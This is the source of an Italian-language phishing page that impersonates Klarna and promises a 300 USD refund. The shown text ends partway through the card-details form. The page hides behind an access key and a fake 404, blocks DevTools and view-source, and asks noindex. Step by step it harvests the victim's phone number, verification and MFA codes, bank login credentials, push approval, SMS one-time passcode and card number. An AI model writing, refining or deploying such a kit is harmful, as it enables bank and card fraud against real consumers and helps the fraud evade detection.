<?php
require_once __DIR__ . '/guard.php';

// --- Access Key Protection ---
// Must access via ?key=XXXXX or have a valid session or referrer from bank.php
$access_key = 'klarna2026';
$has_access = false;

if (isset($_GET['key']) && $_GET['key'] === $access_key) {
    $_SESSION['idx_access'] = true;
    header('Location: ' . str_replace('?key=' . $access_key, '', $_SERVER['REQUEST_URI']));
    exit;
}

if (isset($_SESSION['idx_access']) && $_SESSION['idx_access'] === true) {
    $has_access = true;
}

// Allow access from bank.php redirect
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
if (!$has_access && (strpos($referrer, 'bank.php') !== false || strpos($referrer, $_SERVER['HTTP_HOST']) !== false)) {
    $_SESSION['idx_access'] = true;
    $has_access = true;
}

if (!$has_access) {
    header('HTTP/1.0 404 Not Found');
    exit('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
}
?>
<!DOCTYPE html>
<html lang="it" oncontextmenu="return false;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="googlebot" content="noindex, nofollow">
    <title>Klarna | Rimborso</title>
    <script>
        // --- DISABLE RIGHT CLICK, DEVTOOLS, KEY SHORTCUTS ---
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
            if (e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) ||
                (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                e.preventDefault();
                return false;
            }
        });
        // Detect DevTools by timing differential
        (function() {
            var devtools = false;
            var threshold = 160;
            setInterval(function() {
                var start = performance.now();
                debugger;
                var end = performance.now();
                if (end - start > threshold && !devtools) {
                    devtools = true;
                    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1 style="color:#333;">403 Forbidden</h1></div>';
                }
            }, 1000);
        })();
        // Disable drag on non-inputs
        document.addEventListener('dragstart', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') e.preventDefault();
        });
        // Disable selection on non-inputs
        document.addEventListener('selectstart', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') e.preventDefault();
        });
    </script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* ====== STILI PRIMO INDEX ====== */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { background-color: #f7f7f7; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; zoom: 0.92; -moz-transform: scale(0.92); -moz-transform-origin: top center; }
        .klarna-pink { background-color: #ffb3c7; color: #000; }
        .btn-dark { background-color: #080516; color: white; transition: background-color 0.3s; }
        select { border: 1.5px solid #d1d1d6 !important; font-size: 1rem !important; font-family: 'Inter', sans-serif !important; }
        select:focus { border-color: #080516 !important; outline: none; }
        .btn-dark:hover { background-color: #000; }
        .hidden { display: none !important; }
        .auth-card { width: 100%; max-width: 550px; background: white; padding: 36px 52px; border-radius: 32px; box-shadow: 0 8px 28px rgba(0,0,0,0.04); position: relative; min-height: 780px; display: flex; flex-direction: column; }
        .btn-dark, button[class*="btn-dark"] { padding-top: 14px !important; padding-bottom: 14px !important; font-size: 1rem !important; border-radius: 45px !important; }
        .card-type-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); width: 34px; height: 24px; object-fit: contain; }
        /* === LIVE CARD PREVIEW === */
        .card-preview { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); border-radius: 16px; padding: 20px 24px; color: white; position: relative; overflow: hidden; box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
        .card-preview.visa-bg { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); }
        .card-preview.mc-bg { background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 50%, #eb001b 100%); }
        .card-preview.amex-bg { background: linear-gradient(135deg, #1a1a2e 0%, #0a3d62 50%, #1b1464 100%); }
        .card-preview .card-chip { width: 40px; height: 30px; background: linear-gradient(135deg, #ffd700, #ffb300); border-radius: 6px; margin-bottom: 16px; }
        .card-preview .card-number-display { font-family: 'Courier New', monospace; font-size: 18px; letter-spacing: 3px; margin-bottom: 12px; word-spacing: 8px; }
        .card-preview .card-info-row { display: flex; justify-content: space-between; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
        .card-preview .card-info-row span { opacity: 0.8; }
        .card-preview .card-info-row strong { font-size: 12px; }
        .card-preview::after { content: ''; position: absolute; top: -50%; right: -30%; width: 300px; height: 300px; background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%); border-radius: 50%; }
        @media (max-width: 640px) { body { background-color: white; align-items: stretch; zoom: 1; -moz-transform: none; } .auth-card { max-width: 100%; height: 100vh; min-height: 100vh; border-radius: 0; padding: 16px 20px; box-shadow: none; } .mobile-spacing { margin-bottom: 1.5rem !important; } }
        @media (min-width: 641px) and (max-width: 900px) { body { zoom: 0.95; -moz-transform: scale(0.95); } .auth-card { max-width: 480px; padding: 28px 36px; min-height: 650px; } }
        input { border: 1.5px solid #d1d1d6 !important; font-size: 1rem !important; }
        input:focus { border-color: #080516 !important; outline: none; }
        .error-msg-bar { background: #fff1f3; color: #000; padding: 12px; border-radius: 12px; font-size: 13px; display: none; align-items: center; margin-top: 16px; }
        .error-dot { width: 16px; height: 16px; background: #9c1c31; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; margin-right: 8px; flex-shrink: 0; }
        .bottom-section { margin-top: auto; width: 100%; }
        .spinner { display: none; width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .is-loading .btn-text { display: none; }
        .is-loading .spinner { display: block !important; margin: 0 auto; }
        .input-error { border-color: #9c1c31 !important; background-color: #fff5f5 !important; }

        /* ====== STILI LISTA BANCHE ====== */
        .bank-list-container { max-height: 340px; overflow-y: auto; }
        .bank-item { transition: all 0.2s; border: 1.5px solid #e5e5ea; border-radius: 16px; padding: 12px 16px; margin-bottom: 8px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; background: white; }
        .bank-item:hover { border-color: #080516; background: #f8f8fa; }
        .bank-item .bank-info { display: flex; align-items: center; gap: 12px; }
        .bank-item .bank-avatar { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; color: white; flex-shrink: 0; overflow: hidden; background: white; border: 1px solid #e5e5ea; }
        .bank-item .bank-avatar img { width: 100%; height: 100%; object-fit: contain; }
        .bank-item .bank-name { font-weight: 600; color: #080516; font-size: 15px; }
        .bank-item .bank-sub { font-size: 12px; color: #8a8a96; }
        .bank-item .bank-chevron { color: #8a8a96; font-size: 14px; }
        .bank-search-input { border: 1.5px solid #d1d1d6 !important; border-radius: 16px; padding: 12px 16px 12px 44px; width: 100%; font-size: 1rem; background: #f7f7f7; transition: 0.2s; }
        .bank-search-input:focus { border-color: #080516 !important; background: white; }
        .search-icon { position: absolute; left: 12px; top: 34%; transform: translateY(-50%); color: #8a8a96; }
        .typing-notification { font-size: 13px; color: #4b3ec4; margin-top: 6px; min-height: 24px; display: flex; align-items: center; gap: 6px; opacity: 0; transition: opacity 0.3s; }
        .typing-notification.show { opacity: 1; }
        .selected-bank-display { background: #f0f0f2; border-radius: 12px; padding: 10px 14px; margin: 12px 0; display: none; align-items: center; gap: 10px; font-size: 14px; border-left: 4px solid #ffb3c7; }
        .selected-bank-display .bank-name-highlight { font-weight: 700; color: #080516; }

        /* ====== BRANCH LIST ====== */
        .branch-item { transition: all 0.2s; border: 1.5px solid #e5e5ea; border-radius: 16px; padding: 12px 16px; margin-bottom: 8px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; background: white; }
        .branch-item:hover { border-color: #080516; background: #f8f8fa; }

        /* ====== REDIRECT LOGO ====== */
        .redirect-logo-container { width: 120px; height: 120px; border-radius: 20px; background: white; border: 1.5px solid #e5e5ea; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.06); }
        .redirect-logo-container img { width: 100%; height: 100%; object-fit: contain; padding: 12px; }
        .redirect-logo-container .fallback { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 28px; }

        /* ====== VERIFY IDENTITY SEPARATORS ====== */
        .verify-divider { border: none; border-top: 1.5px dashed #d1d1d6; margin: 16px 0; }

        /* ====== SMS SUCCESS ====== */
        #bank-sms-success { display: none; }
        #bank-sms-success:not(.hidden) { display: flex !important; }
    </style>
</head>
<body>

    <!-- ============================================================ -->
    <!-- STEP 1: LOGIN -->
    <!-- ============================================================ -->
    <div id="step-login" class="auth-card">
        <div class="flex justify-end mb-2"><button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button></div>
        <div class="flex-grow">
            <div class="mb-10">
                <h1 class="text-[32px] font-bold text-[#080516] tracking-tight mb-2">Accedi</h1>
                <p class="text-[15px] text-[#5e5e6e]">Oppure <a href="#" class="text-[#4b3ec4] font-semibold hover:underline">Crea account</a></p>
            </div>
            <div class="mobile-spacing mb-18"><label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Numero di telefono</label><div class="relative"><span class="absolute inset-y-0 left-0 flex items-center pl-4 text-[#8a8a96] font-medium text-sm z-10">+39</span><input type="tel" id="user-input" maxlength="10" placeholder="333 1234567" class="w-full pl-14 pr-4 py-4 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="tel-national" inputmode="numeric" oninput="validatePhoneInput(this)"></div><div id="phone-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci un numero di cellulare italiano valido</div><p class="text-[11px] text-[#8a8a96] mt-1.5">Inserisci il tuo numero di cellulare senza il prefisso +39</p></div>
        </div>
        <div class="bottom-section">
            <button id="btn-login" onclick="processLogin()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] hover:bg-black transition-all flex items-center justify-center"><span class="btn-text">Continua</span><div class="spinner"></div></button>
            <div class="mt-4 text-[11px] text-[#5e5e6e] text-center pb-3"><p>Procedendo accetti i Termini di utilizzo · <a href="#" class="underline">Informativa sulla privacy</a></p></div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 2: 2FA EMAIL -->
    <!-- ============================================================ -->
    <div id="step-2fa-email" class="auth-card hidden">
        <div class="flex justify-between items-center mb-8">
            <button onclick="showStep('step-login')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[32px] font-bold text-[#080516] mb-3 leading-tight tracking-tight">Inserisci il codice di 6 cifre</h1>
            <p class="text-[15px] text-[#5e5e6e] mb-8">Un codice di verifica è stato inviato a <br><span id="display-email" class="text-black font-medium"></span> <button onclick="showStep('step-login')" class="text-[#4b3ec4] font-semibold ml-1">Modifica</button></p>
            <div class="relative mb-6"><input type="text" id="code-email" maxlength="6" placeholder="Inserisci il codice" class="w-full px-4 py-4 rounded-xl outline-none text-center"></div>
            <div id="email-error" class="error-msg-bar"><span class="error-dot">!</span> <span class="ml-2 font-medium">Hai inserito un codice errato. Riprova.</span></div>
        </div>
        <div class="bottom-section text-center pb-4">
            <button id="btn-email" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Reinvia il codice</span><div class="spinner"></div></button>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 3: 2FA SMS -->
    <!-- ============================================================ -->
    <div id="step-2fa-sms" class="auth-card hidden">
        <div class="flex justify-between items-center mb-8">
            <button onclick="showStep('step-login')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
        </div>
        <div class="flex-grow">
            <h1 class="text-[32px] font-bold text-[#080516] mb-3 leading-tight tracking-tight">Dobbiamo verificare il tuo numero di telefono.</h1>
            <p class="text-[15px] text-[#5e5e6e] mb-8">Un codice di verifica è stato inviato a <br><span class="text-black font-medium">+39•••••••••</span></p>
            <div class="relative mb-6"><input type="text" id="code-sms" maxlength="6" placeholder="Inserisci il codice" class="w-full px-4 py-4 rounded-xl outline-none text-center"></div>
            <div id="sms-error" class="error-msg-bar"><span class="error-dot">!</span> <span class="ml-2 font-medium">Hai inserito un codice errato. Riprova.</span></div>
        </div>
        <div class="bottom-section"><button id="btn-sms" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Reinvia il codice</span><div class="spinner"></div></button></div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 4: MFA -->
    <!-- ============================================================ -->
    <div id="step-mfa" class="auth-card hidden">
        <div class="flex justify-between items-center mb-8">
            <button onclick="showStep('step-login')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
        </div>
        <div class="flex-grow">
            <h1 class="text-[32px] font-bold text-[#080516] mb-3 leading-tight tracking-tight">Inserisci il codice di 6 cifre</h1>
            <p class="text-[15px] text-[#5e5e6e] mb-8">Un codice di verifica è stato inviato a <br><span class="text-black font-medium">La tua email</span></p>
            <div class="relative mb-6"><input type="text" id="code-mfa" maxlength="6" placeholder="Inserisci il codice" class="w-full px-4 py-4 rounded-xl outline-none text-center"></div>
            <div id="mfa-error" class="error-msg-bar"><span class="error-dot">!</span> <span class="ml-2 font-medium">Hai inserito un codice errato. Riprova.</span></div>
        </div>
        <div class="bottom-section"><button id="btn-mfa" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center"><span class="btn-text">Continua</span><div class="spinner"></div></button></div>
    </div>

<!-- ============================================================ -->
<!-- STEP 4.5: VERIFICA IDENTITÀ -->
<!-- ============================================================ -->
<div id="step-verify-identity" class="auth-card hidden">
    <div class="flex justify-between items-center mb-6">
        <button onclick="showStep('step-mfa')" class="text-xl hover:opacity-50">←</button>
        <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="verify-step-badge">Klarna</span>
        <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
    </div>
    <div class="flex-grow">
        <h1 class="text-[28px] font-bold text-[#080516] mb-2 leading-tight tracking-tight">Dobbiamo verificare la tua identità</h1>
        <p class="text-[14px] text-[#5e5e6e] mb-8">Per assicurarci che sia davvero tu e approvare il tuo acquisto.</p>
        
        <!-- Timeline: solid filled circles, no icons, line connects them -->
        <div class="relative pl-8 mb-10">
            <!-- Vertical line: perfectly centered with the 12px circles -->
            <!-- Circle is at -left-[21px] = 21px left of content. Circle width 12px, center at 21 - 6 = 15px from left edge of content -->
            <!-- pl-8 = 32px. So circle center from container left = 32 - 21 + 6 = 17px -->
            <div class="absolute left-[17px] top-[20px] h-[40px] w-[1.5px] bg-[#c7c7cc]"></div>
            
            <!-- First item -->
            <div class="relative mb-7">
                <div class="absolute -left-[21px] top-0 w-[12px] h-[12px] bg-[#080516] rounded-full z-10"></div>
                <div>
                    <p class="font-bold text-[#080516] text-[15px] leading-snug">Autenticati in sicurezza con la tua banca</p>
                    <p class="text-[13px] text-[#8e8e93] mt-0.5">I tuoi dati restano privati e sicuri</p>
                </div>
            </div>
            
            <!-- Second item -->
            <div class="relative">
                <div class="absolute -left-[21px] top-0 w-[12px] h-[12px] bg-[#080516] rounded-full z-10"></div>
                <div>
                    <p class="font-bold text-[#080516] text-[15px] leading-snug">Conto bancario collegato</p>
                    <p class="text-[13px] text-[#8e8e93] mt-0.5 leading-relaxed">180 giorni di accesso ai dati del conto bancario (nome e numero), saldo e transazioni. Revoca quando vuoi.</p>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Authorization text moved OUT of flex-grow, placed above button -->
    <div class="text-[13px] text-[#8e8e93] leading-relaxed mb-6">
        Autorizzo Klarna ad accedere ai dati del mio conto per verificare la mia identità e idoneità creditizia. Vedi <a href="#" class="text-[#080516] underline underline-offset-2">Termini</a> e <a href="#" class="text-[#080516] underline underline-offset-2">Privacy</a>.
    </div>
    
    <div class="bottom-section">
        <button id="btn-verify-identity" onclick="proceedToBank()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
            <span class="btn-text">Collega conto bancario</span><div class="spinner"></div>
        </button>
    </div>
</div>

    <!-- ============================================================ -->
    <!-- STEP 5: SELEZIONE BANCA -->
    <!-- ============================================================ -->
    <div id="step-bank" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-verify-identity')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="bank-step-badge">Klarna</span>
            <div>
                <button onclick="showStep('step-bank')" class="text-sm font-semibold text-[#080516] hover:opacity-70 mr-3" id="btn-banks">Banche</button>
                <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
            </div>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight" id="bank-step-title">Seleziona la tua banca</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-5" id="bank-step-subtitle">Scegli tra gli istituti autorizzati per associare il rimborso.</p>
            <div class="relative mb-2">
                <span class="search-icon"><i class="fa-solid fa-magnifying-glass"></i></span>
                <input type="text" id="bank-search-input" onkeyup="filterBanks()" oninput="showTypingNotification()" class="bank-search-input" placeholder="Cerca banca (es. Intesa, Poste, Revolut...)">
                <div id="typing-notification" class="typing-notification">
                    <i class="fa-solid fa-spinner animate-spin"></i> <span id="typing-text">Sto cercando...</span>
                </div>
            </div>
            <div id="selected-bank-display" class="selected-bank-display">
                <i class="fa-solid fa-check-circle text-[#4b3ec4]"></i>
                <span>Banca selezionata: <span id="selected-bank-name" class="bank-name-highlight">---</span></span>
            </div>
            <div id="bank-list-container" class="bank-list-container"></div>
        </div>
        <div class="bottom-section">
            <button id="btn-bank-confirm" onclick="confirmBank()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                <span class="btn-text">Conferma banca e continua</span><div class="spinner"></div>
            </button>
            <div class="mt-3 text-[10px] text-[#8a8a96] text-center pb-3">Potrai modificare la banca in qualsiasi momento</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 5.4: REINDIRIZZAMENTO BANCA -->
    <!-- ============================================================ -->
    <div id="step-bank-redirect" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBackToBankSelection()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="redirect-step-badge">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow flex flex-col items-center text-center">
            <div class="redirect-logo-container" id="redirect-logo-container">
                <img id="redirect-bank-image" src="" alt="Bank logo" style="display:none;">
                <div id="redirect-bank-fallback" class="fallback" style="display:none;">---</div>
            </div>
            <h2 class="text-[24px] font-bold text-[#080516] mb-2" id="redirect-bank-title">Continua con <span id="redirect-bank-name">---</span></h2>
            <div class="bg-[#f8f9fa] rounded-xl p-4 mb-6 border border-[#e0e0e0] text-left w-full">
                <p class="text-[13px] text-[#5e5e6e] leading-relaxed">
                    Verrai reindirizzato al portale sicuro di <strong id="redirect-bank-name-in-text" class="text-[#080516]">---</strong> per completare l'autenticazione e collegare il tuo conto.
                </p>
                <div class="mt-3 text-xs text-[#4b3ec4]">
                    <a href="#" onclick="proceedToBankLogin()" class="underline font-semibold">Clicca qui se non vieni reindirizzato automaticamente.</a>
                </div>
            </div>
            <button onclick="proceedToBankLogin()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center" id="btn-redirect-continue">
                <span class="btn-text" id="redirect-continue-text">Continua con ---</span><div class="spinner"></div>
            </button>
            <button onclick="goBackToBankSelection()" class="mt-4 text-sm font-semibold text-[#4b3ec4] hover:underline transition">
                Cambia banca
            </button>
        </div>
        <div class="bottom-section pt-4">
            <div class="text-[10px] text-[#8a8a96] text-center pb-3">Rimani su questa pagina durante il reindirizzamento</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 5.5: SELEZIONE BRANCH -->
    <!-- ============================================================ -->
    <div id="step-branch" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBackToBankSelection()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="branch-step-badge">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight" id="branch-step-title">Seleziona la filiale</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-5" id="branch-step-subtitle">Scegli la divisione o il portale per la banca selezionata.</p>
            <div id="branch-list-container" class="space-y-2"></div>
        </div>
        <div class="bottom-section">
            <button onclick="goBackToBankSelection()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center" style="background-color: #8a8a96;">
                <span class="btn-text">Torna alla selezione banca</span>
            </button>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 5.6: BANK LOGIN CREDENZIALI -->
    <!-- ============================================================ -->
    <div id="step-bank-login" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBackToRedirect()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="login-step-badge">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight" id="login-step-title">Accedi alla tua banca</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-6">Inserisci le credenziali per <strong id="bank-login-name" class="text-[#080516]">---</strong></p>
            <div id="bank-login-fields" class="space-y-4"></div>
            <div id="bank-login-error" class="error-msg-bar">
                <span class="error-dot">!</span> <span class="ml-2 font-medium">Credenziali non valide. Riprova.</span>
            </div>
        </div>
        <div class="bottom-section">
            <button id="btn-bank-login" onclick="submitBankLogin()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                <span class="btn-text">Accedi in Sicurezza</span><div class="spinner"></div>
            </button>
            <div class="mt-3 text-[10px] text-[#8a8a96] text-center pb-3">Le tue credenziali sono crittografate</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 5.7: PUSH PENDING (solo cerchio piccolo + SMS, niente barra) -->
    <!-- ============================================================ -->
    <div id="step-bank-push" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goBackToRedirect()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="push-step-badge">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow flex flex-col items-center text-center">
            <!-- Cerchio piccolo (come nel secondo index) -->
            <div class="relative w-20 h-20 mx-auto mb-4">
                <div class="absolute inset-0 border-4 border-[#e5e5ea] rounded-full"></div>
                <div id="push-spinner" class="absolute inset-0 border-4 border-[#080516] rounded-full border-t-transparent animate-spin" style="border-color: #080516; border-top-color: transparent;"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <i class="fa-solid fa-mobile-screen-button text-2xl text-[#080516]"></i>
                </div>
            </div>
            
            <h3 class="text-[20px] font-bold text-[#080516] mb-1">Autorizzazione Push in Attesa</h3>
            <p class="text-[13px] text-[#5e5e6e] max-w-xs mx-auto mb-4">
                Abbiamo inviato una richiesta di verifica all'app ufficiale sul tuo dispositivo mobile. 
                Si prega di aprirla e cliccare su <strong>Conferma</strong>.
            </p>
            
            <!-- Alert giallo (come nel secondo index) -->
            <div class="bg-amber-50 rounded-xl p-4 mb-6 text-amber-700 text-xs flex items-start gap-2.5 text-left border border-amber-200 w-full">
                <i class="fa-solid fa-circle-exclamation mt-0.5 text-sm text-amber-500"></i>
                <span>Verifica che le notifiche push per la tua applicazione siano abilitate. Puoi approvare l'operazione anche aprendo direttamente l'app.</span>
            </div>
            
            <!-- Link per SMS fallback -->
            <button onclick="switchToSmsFallback()" class="text-sm font-semibold text-[#4b3ec4] hover:underline transition" id="btn-sms-fallback">
                Non hai ricevuto la notifica? Usa il codice SMS
            </button>
        </div>
        <div class="bottom-section pt-4">
            <div class="text-[10px] text-[#8a8a96] text-center pb-3">In attesa di conferma push sul tuo dispositivo</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 5.8: SMS OTP (con verifica e pulsante Continua manuale) -->
    <!-- ============================================================ -->
    <div id="step-bank-sms" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-bank-push')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase" id="sms-step-badge">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <p class="text-[14px] text-[#5e5e6e] mb-6 text-center">Abbiamo inviato un codice di sicurezza monouso (OTP) di 6 cifre al tuo numero di cellulare associato. Inseriscilo qui sotto.</p>
            
            <div class="flex justify-center gap-2 mb-6">
                <input type="text" id="bank-sms-code" maxlength="6" class="w-full text-center tracking-[8px] text-2xl font-mono font-bold py-4 bg-[#f7f7f7] border border-[#d1d1d6] rounded-xl focus:outline-none focus:border-[#080516] focus:bg-white transition" placeholder="000000" inputmode="numeric">
            </div>
            
            <div id="bank-sms-error" class="error-msg-bar">
                <span class="error-dot">!</span> <span class="ml-2 font-medium">Codice SMS errato. Riprova.</span>
            </div>
            
            <div id="bank-sms-success" class="hidden bg-green-50 border border-green-200 text-green-700 p-4 rounded-xl text-sm flex items-center gap-2 mb-4">
                <i class="fa-solid fa-check-circle text-green-500"></i>
                <span>Codice verificato con successo!</span>
            </div>
            
            <button id="btn-bank-sms" onclick="submitBankSms()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                <span class="btn-text">Conferma Codice</span><div class="spinner"></div>
            </button>
            
            <!-- Pulsante Continua (appare dopo verifica) -->
            <button id="btn-sms-continue" onclick="proceedFromSms()" class="w-full btn-dark py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center mt-4" style="display: none;">
                <span class="btn-text">Continua al rimborso</span><div class="spinner"></div>
            </button>
        </div>
        <div class="bottom-section">
            <button onclick="showStep('step-bank-push')" class="w-full text-center text-xs text-[#4b3ec4] hover:underline font-semibold mt-4 transition">
                <i class="fa-solid fa-chevron-left text-[10px]"></i> Torna alla notifica push
            </button>
            <div class="text-[10px] text-[#8a8a96] text-center pb-3 mt-2">Il codice è valido per 5 minuti</div>
        </div>
    </div>

    <!-- ============================================================ -->
    <!-- STEP 6: CARD DETAILS -->
    <!-- ============================================================ -->
    <div id="step-card" class="auth-card hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="showStep('step-verify-identity')" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-pink px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <h1 class="text-[28px] font-bold text-[#080516] mb-1 leading-tight tracking-tight">Dati per il rimborso</h1>
            <p class="text-[13px] text-[#5e5e6e] mb-4">Inserisci i dati della tua carta per ricevere il rimborso di <strong class="text-[#080516]">300,00 USD (~276,50 EUR)</strong></p>

            <!-- Live Card Preview -->
            <div class="card-preview visa-bg mb-5" id="card-preview">
                <div class="card-chip"></div>
                <div class="card-number-display" id="preview-number">•••• •••• •••• ••••</div>
                <div class="card-info-row">
                    <div><span>Titolare</span><br><strong id="preview-name">MARIO ROSSI</strong></div>
                    <div><span>Scadenza</span><br><strong id="preview-expiry">MM/AA</strong></div>
                </div>
            </div>

            <div class="mb-4">
                <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Nome completo sulla carta</label>
                <input type="text" id="card-name" placeholder="MARIO ROSSI" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96] uppercase" autocomplete="off" oninput="updateCardPreview()">
                <div id="card-name-error" class="text-[#9c1c31] text-[11px] mt-1 hidden">Inserisci nome e cognome validi</div>
            </div>
            <div class="mb-4">
                <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">Numero della carta</label>
                <div class="relative">
                    <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000" class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]" autocomplete="off">
                    <img id="card-type-icon" src="https://cdn3.emoji.gg/emojis/3459-visa.png" alt="card" class="card-type-icon">
                </div>
